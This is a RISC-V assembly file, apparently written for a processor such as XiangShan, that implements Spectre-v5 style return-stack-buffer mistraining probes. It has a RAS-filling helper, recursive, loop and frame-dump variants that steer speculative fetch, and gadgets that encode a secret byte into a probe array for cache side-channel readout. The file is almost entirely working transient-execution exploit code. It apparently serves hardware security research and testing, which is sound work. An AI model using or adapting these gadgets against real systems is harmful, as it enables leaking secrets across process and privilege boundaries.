#ifndef V5_TRAIN_PASSES
#define V5_TRAIN_PASSES 8
#endif

#ifndef V5_RAS_DEPTH
#define V5_RAS_DEPTH 24
#endif

#ifndef V5_RAS_FILL_DEPTH
#define V5_RAS_FILL_DEPTH V5_RAS_DEPTH
#endif

#if V5_RAS_FILL_DEPTH < 1
#error "V5_RAS_FILL_DEPTH must be at least 1"
#endif

#if V5_RAS_FILL_DEPTH < V5_RAS_DEPTH
#error "V5_RAS_FILL_DEPTH must be >= V5_RAS_DEPTH to start from a full RAS"
#endif

#ifndef V5_IN_PLACE_DELAY
#define V5_IN_PLACE_DELAY 128
#endif

  .section .u_text, "ax", @progbits
  .align 4
  .globl xs_v5_fill_ras
  .type xs_v5_fill_ras, @function
  .globl xs_v5_recursive_ret_probe
  .type xs_v5_recursive_ret_probe, @function
  .globl xs_v5_loop_ret_probe
  .type xs_v5_loop_ret_probe, @function

/* Fill the frontend RAS before the victim gadget starts.
 *
 * A normal recursive helper would empty the RAS while unwinding. This helper
 * emits V5_RAS_FILL_DEPTH call-class instructions, then jumps back through a
 * non-return JALR source register so the calls stay resident in the predictor.
 */
xs_v5_fill_ras:
  mv   t6, ra
  li   t0, V5_RAS_FILL_DEPTH
  addi t0, t0, -1
  beqz t0, xs_v5_fill_ras_done
  call xs_v5_fill_ras_step

xs_v5_fill_ras_done:
  jalr zero, 0(t6)

  .align 4
xs_v5_fill_ras_step:
  addi t0, t0, -1
  beqz t0, xs_v5_fill_ras_done
  call xs_v5_fill_ras_step

  .size xs_v5_fill_ras, .-xs_v5_fill_ras

/* a0 = secret byte address
 * a1 = probe array
 *
 * Recursive-return variant. It puts pressure on the frontend RAS with nested
 * calls/returns, then reaches a branch that is architecturally not taken. A
 * transient path to xs_v5_speculative_gadget encodes the secret byte into the
 * probe array if return prediction sends fetch down the wrong path.
 */
xs_v5_recursive_ret_probe:
  addi sp, sp, -32
  sd   ra, 24(sp)
  sd   s0, 16(sp)
  sd   s1, 8(sp)
  sd   s2, 0(sp)

  mv   s0, a0
  mv   s1, a1

  lbu  t0, 0(s0)
  fence

  li   a0, 0
  li   a1, V5_RAS_DEPTH
  li   a2, V5_RAS_DEPTH + V5_TRAIN_PASSES
  call xs_v5_func1

  ld   s2, 0(sp)
  ld   s1, 8(sp)
  ld   s0, 16(sp)
  ld   ra, 24(sp)
  addi sp, sp, 32
  ret

  .align 4
xs_v5_func1:
  addi a0, a0, 1
  bge  a0, a1, xs_v5_call_func2
    addi sp, sp, -8
    sd   ra, 0(sp)
    call xs_v5_func1
    ld   ra, 0(sp)
    addi sp, sp, 8
    j    xs_v5_after

xs_v5_call_func2:
    addi sp, sp, -8
    sd   ra, 0(sp)
    call xs_v5_func2
    ld   ra, 0(sp)
    addi sp, sp, 8

xs_v5_after:
  li   t1, 1
  li   t0, 2
  .rept V5_IN_PLACE_DELAY
  mul  t0, t0, t1
  .endr
  beqz t0, xs_v5_speculative_gadget
  ret

  .align 4
xs_v5_func2:
  addi a0, a0, 1
  bge  a0, a2, xs_v5_ret_to_func1
    addi sp, sp, -8
    sd   ra, 0(sp)
    call xs_v5_func2
    ld   ra, 0(sp)
    addi sp, sp, 8
    fence
    ret

xs_v5_ret_to_func1:
  fence
  ret

  .align 4
xs_v5_speculative_gadget:
  lbu  t4, 0(s0)
  slli t4, t4, 6
  add  t4, s1, t4
  lbu  t5, 0(t4)
  ret

  .size xs_v5_recursive_ret_probe, .-xs_v5_recursive_ret_probe

/* Ret-loop comparison variant. This keeps returning to the local victim block
 * by overwriting ra with the current PC. It is useful if the recursive mode is
 * too sensitive to the exact RAS depth/configuration.
 */
  .align 4
xs_v5_loop_ret_probe:
  addi sp, sp, -48
  sd   ra, 40(sp)
  sd   s0, 32(sp)
  sd   s1, 24(sp)
  sd   s2, 16(sp)
  sd   s3, 8(sp)
  sd   s4, 0(sp)

  mv   s0, a0
  mv   s1, a1
  li   s2, V5_RAS_DEPTH
  li   s3, V5_TRAIN_PASSES
  add  s2, s2, s3
  mv   s4, ra

  lbu  t0, 0(s0)
  fence

xs_v5_lp_victim:
  auipc ra, 0

  .align 4
xs_v5_lp_target:
  li   t1, 1
  li   t0, 2
  .rept V5_IN_PLACE_DELAY
  mul  t0, t0, t1
  .endr
  beqz t0, xs_v5_lp_speculative_gadget

  addi s2, s2, -1
  beqz s2, xs_v5_lp_done
  ret

xs_v5_lp_done:
  mv   ra, s4
  ld   s4, 0(sp)
  ld   s3, 8(sp)
  ld   s2, 16(sp)
  ld   s1, 24(sp)
  ld   s0, 32(sp)
  ld   ra, 40(sp)
  addi sp, sp, 48
  ret

  .align 4
xs_v5_lp_speculative_gadget:
  lbu  t4, 0(s0)
  slli t4, t4, 6
  add  t4, s1, t4
  lbu  t5, 0(t4)
  ret

  .size xs_v5_loop_ret_probe, .-xs_v5_loop_ret_probe

  .align 4
  .globl xs_v5_frame_dump_probe
  .type xs_v5_frame_dump_probe, @function

/* Tar-style return-stack variant.
 * The helper below mirrors the reference tar PoC: it restores ra from the
 * caller's saved frame, burns a few cycles, and returns architecturally to the
 * caller while the fallthrough after the call is the speculative gadget.
 */
xs_v5_frame_dump_probe:
  addi sp, sp, -32
  sd   ra, 24(sp)
  sd   s0, 16(sp)
  sd   s1, 8(sp)
  sd   s2, 0(sp)

  mv   s0, a0
  mv   s1, a1

  call xs_v5_frame_dump_stub

  lbu  t4, 0(s0)
  slli t4, t4, 6
  add  t4, s1, t4
  lbu  t5, 0(t4)

  ld   s2, 0(sp)
  ld   s1, 8(sp)
  ld   s0, 16(sp)
  ld   ra, 24(sp)
  addi sp, sp, 32
  ret

  .size xs_v5_frame_dump_probe, .-xs_v5_frame_dump_probe

  .align 4
xs_v5_frame_dump_stub:
  addi sp, sp, -16
  sd   ra, 8(sp)

  ld   ra, 40(sp)
  addi sp, sp, 48

  addi ra, ra, -2
  li   t2, 2
  .rept 16
  addi t2, t2, 1
  .endr
  .rept 16
  addi t2, t2, -1
  .endr
  add  ra, ra, t2

  ret
